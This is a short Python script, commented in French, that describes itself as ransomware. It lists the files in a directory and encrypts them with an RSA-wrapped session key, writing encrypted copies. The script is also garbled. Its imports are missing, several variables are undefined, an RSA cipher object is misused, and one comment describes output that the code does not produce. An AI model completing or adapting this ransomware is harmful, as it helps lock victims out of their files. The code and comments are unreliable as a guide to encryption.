import base64


with open('public.pem', 'rb') as f:
    public = f.read()
print(base64.b64encode(public))

##Lorsque ce code est exécuté, il imprimera "b'hi friends, this is base64 encoding'" qui est la version décodée de la chaîne de caractères encodée en base64.

files=[]

def scanRecurse(): ##On peut étendre le ransomware à d'autres fichiers en utilisant un argument baseDir dans la fonction
    for entry in os.scandir():
        if entry == "malware.py" or entry == "generatekey.py":
            continue
        if entry.is_file():
            files.append(entry)
    return files

def encrypt(dataFile, publicKey):

    with open(dataFile, "r") as f:
        data=f.read()

        #Conversion en bytes car les opérations de chiffrement agissent sur les bits
        #En cas de non conversion, on pourrait avoir des erreurs dee chiffrement
        data=bytes(data)

    # Créer un objet clé public
    key= RSA.import_key(publicKey)
    # générer une clé de session qui sera utilisée pour chiffrer les données.
    sessionKey=os.urandom(16)

    # Crypter la session avec la clé de session

    cipher= PKCS1_OAEP.new(key)
    encryptedSessionKey = cipher.encrypt(sessionKey)

    # Sauvegarder les données encryptees dans un fichier
    [fileName, fileExtension]= dataFile.split('.')

    encryptedFile= fileName + '_encrypted.' + fileExtension
    with open(encryptedFile, "wb") as f:
        [f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext)]
        print ('Encrypted file saved to ' + encryptedFile)

fileName= 'test.txt'
encrypt(fileName, pubKey)
